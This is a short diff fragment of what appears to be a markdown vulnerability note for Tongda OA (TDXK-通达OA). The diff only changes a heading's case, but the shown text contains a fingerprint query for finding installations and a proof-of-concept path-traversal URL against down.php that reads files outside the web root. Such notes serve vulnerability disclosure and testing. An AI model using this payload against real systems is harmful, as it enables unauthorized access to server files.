@@ -6,7 +6,7 @@
 app="TDXK-通达OA"
 ```
 
-## poc
+## POC
 
 ```
 http://127.0.0.1/inc/package/down.php?id=../../../cache/org
